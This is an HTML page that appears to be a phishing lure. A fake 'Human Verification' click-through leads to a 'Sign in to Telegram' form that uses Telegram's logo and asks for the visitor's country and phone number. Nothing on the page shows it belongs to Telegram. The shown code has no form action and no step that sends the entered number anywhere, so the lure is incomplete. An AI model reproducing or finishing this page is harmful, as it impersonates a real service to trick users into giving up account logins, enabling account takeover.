<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start; /* Aligns content to the top */
            height: 100vh;
            background-color: #111827;
            overflow: hidden;
        }

        .verification-container {
            text-align: center;
            padding-top: 20px; /* Moves the content higher */
            background-color: #111827; /* Background color same as body to blend in */
            width: 100%;
            max-width: 500px;
        }

        .verification-container h1 {
            font-size: 28px;
            color: #FFFFFF;
            margin-bottom: 20px;
            font-weight: 600;
            margin-top: 0;
        }

        .verification-container p {
            font-size: 16px;
            color: #E5E7EB;
            margin-bottom: 40px;
        }

        .verification-container button {
            font-size: 20px; /* Larger font size */
            font-weight: 600;
            color: #FFFFFF;
            background-color: #2F855A; /* Green gradient background */
            border: none;
            border-radius: 8px;
            padding: 15px 0; /* Taller button */
            cursor: pointer;
            transition: background-color 0.3s;
            width: 100%;
            max-width: 400px; /* Makes the button as wide as the text */
            background: linear-gradient(135deg, #3B806F, #2F855A); /* Add a gradient */
        }

        .verification-container button:hover {
            background-color: #276749;
        }

        .container {
            text-align: center;
            width: 90%;
            max-width: 380px;
            margin-top: 2cm; /* Adjusted by 2 cm */
            position: relative;
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            display: none;
            background-color: #ffffff;
            height: 100%; /* Make the container take full height */
            max-height: 100vh; /* Limit height to viewport height */
            overflow-y: auto; /* Make container scrollable */
        }

        .container img {
            width: 80px;
            margin-bottom: 20px;
            border-radius: 50%;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin-bottom: 10px;
            font-weight: 600;
        }

        p {
            font-size: 14px;
            color: #777777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
            position: relative;
        }

        .input-group label {
            display: block;
            font-size: 12px;
            color: #555555;
            margin-bottom: 5px;
        }

        select, input[type="tel"], .dropdown {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
            transition: all 0.2s ease;
        }

        select:focus, input[type="tel"]:focus, .dropdown:hover {
            border-color: #0088cc;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
        }

        .dropdown-container {
            position: relative;
        }

        .dropdown {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
            background-color: #ffffff;
            color: #333333;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 12px;
            height: 42px;
        }

        .dropdown span {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }

        .dropdown .flag {
            display: none; /* Hide the flag */
        }

        .dropdown .country-name {
            flex-grow: 1;
            text-align: left;
        }

        .dropdown .country-code {
            display: none; /* Hide the country code */
        }

        .dropdown-menu {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            right: 0;
            background-color: #ffffff;
            border: 1px solid #ccc;
            border-radius: 12px;
            max-height: 300px;
            overflow-y: auto;
            z-index: 1000;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            animation: fadeIn 0.2s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .dropdown-menu.show {
            display: block;
        }

        .dropdown-item {
            padding: 10px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            color: #333333;
            transition: background-color 0.2s ease;
            border-bottom: 1px solid #eee;
        }

        .dropdown-item:last-child {
            border-bottom: none;
        }

        .dropdown-item img {
            width: 30px;
            height: 20px; /* Rectangular flags */
            object-fit: cover;
            margin-right: 10px;
        }

        .dropdown-item span {
            display: flex;
            align-items: center;
        }

        .dropdown-item span .country-name {
            margin-right: 10px; /* Space between country name and code */
        }

        .dropdown-item span .country-code {
            font-weight: bold;
        }

        .dropdown-item:hover {
            background-color: #f5f5f5;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
            transition: background-color 0.2s ease;
        }

        .button:hover {
            background-color: #007ab8;
        }

        @media (max-width: 600px) {
            .container {
                width: 95%;
                max-width: 340px;
                margin-top: 2cm; /* Move up on mobile by 2 cm */
            }

            .verification-container button {
                max-width: 80%; /* Make button slightly smaller on mobile */
            }
        }
    </style>
</head>
<body>
    <div class="verification-container" id="verificationContainer">
        <h1>Human Verification</h1>
        <p>Verify below to be granted entry</p>
        <button onclick="startSignIn()">Click here</button>
    </div>

    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group dropdown-container">
            <label for="countryCode">Country</label>
            <div id="countryCode" class="dropdown" onclick="toggleDropdown()">
                <span><span class="country-name"></span></span>
            </div>
            <div id="dropdownMenu" class="dropdown-menu"></div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="tel" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Phone Number" onfocus="scrollAwayKeyboard()">
        </div>

        <div>
            <input type="submit" value="Next" class="button">
        </div>
    </div>

    <script>
        function toggleDropdown() {
            const dropdownMenu = document.getElementById('dropdownMenu');
            dropdownMenu.classList.toggle('show');
        }

        function scrollAwayKeyboard() {
            document.body.style.overflow = 'auto';
        }

        // Placeholder for the sign-in function
        function startSignIn() {
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('initialContainer').style.display = 'block';
        }

        // Populate the dropdown with country options
        const countries = [
            {name: 'United States', code: '+1', flag: 'https://restcountries.com/v3.1/all/flags/us.png'},
            // Add other countries here
        ];

        const dropdownMenu = document.getElementById('dropdownMenu');

        countries.forEach(country => {
            const item = document.createElement('div');
            item.classList.add('dropdown-item');
            item.innerHTML = `
                <img src="${country.flag}" alt="${country.name} Flag">
                <span class="country-name">${country.name}</span>
                <span class="country-code">${country.code}</span>
            `;
            item.addEventListener('click', () => {
                document.querySelector('.dropdown .country-name').textContent = country.name;
                document.querySelector('.dropdown .country-code').textContent = country.code;
                document.getElementById('dropdownMenu').classList.remove('show');
            });
            dropdownMenu.appendChild(item);
        });

        // Adjust the page layout when the keyboard is opened/closed
        window.addEventListener('resize', () => {
            document.body.style.overflow = window.innerHeight < screen.height ? 'hidden' : 'auto';
        });
    </script>
</body>
</html>
